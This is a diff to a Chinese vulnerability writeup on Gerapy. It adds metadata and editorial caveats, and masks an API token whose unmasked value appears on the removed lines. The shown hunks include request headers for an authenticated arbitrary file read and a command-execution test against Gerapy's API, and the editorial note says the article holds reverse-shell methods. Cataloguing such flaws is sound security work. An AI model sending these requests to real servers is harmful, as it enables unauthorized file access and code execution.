@@ -1,8 +1,55 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "漏洞预警：Gerapy 项目 的二次漏洞挖掘"
+product: "Gerapy"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "<=0.9.7 claimed; authenticated API; root is assumption not guaranteed"
+source_url: "https://mp.weixin.qq.com/s/-TkfZru1ED-YRxhPMjPJsA"
+source_status: "recorded"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
+id: "vw-738be3eac44a1cf91db8d5bb"
+entity_id: "ve-738be3eac44a1cf91db8d5bb"
+schema_version: "1"
 ---
 
 # 漏洞预警：Gerapy 项目 的二次漏洞挖掘
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：<=0.9.7 claimed; authenticated API; root is assumption not guaranteed
+- 证据范围：Overlaps5/6 but adds file-write analysis and post-clone-fix chronology; preserve unique content
+
+### 本次正文校订
+
+- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- Do not merge whole article as duplicate of single read/RCE entries; retain issue-specific evidence
+- Root privilege generalization and version/fix timeline need source verification
+- File-write request/code only images; no textual endpoint
+- Large image separators/marketing, incomplete HTTP Content-Type and copied auth token
+- No CVE or patch mapping for three distinct flaws
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 文中的明文凭据、会话或密钥已用中段星号脱敏，保留首尾供比对；示例不能直接照抄登录。仅替换为自有隔离环境凭据，已暴露的真实凭据应撤销或轮换。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-TkfZru1ED-YRxhPMjPJsA)
@@ -88,12 +135,12 @@ def project_file_read(request):
 
 path 参数与 label 参数皆可控，攻击者只需要传入 json 数据构造特殊请求就可以读取服务器中的文件  
 
-```
+```http
 POST /api/project/file/read HTTP/1.1
 Host: 
 Content-Length: 35
 Accept: application/json, text/plain, */*
-Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
+Authorization: Token 0f************************f0
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
 Content-Type: application/json;charset=UTF-8
 Accept-Encoding: gzip, deflate
@@ -125,13 +172,13 @@ Connection: close
 
 构造请求包测试命令执行
 
-```
+```http
 POST /api/project/1/parse HTTP/1.1
 Host: 
 Pragma: no-cache
 Cache-Control: no-cache
 Accept: application/json, text/plain, */*
-Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
+Authorization: Token 0f************************f0
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
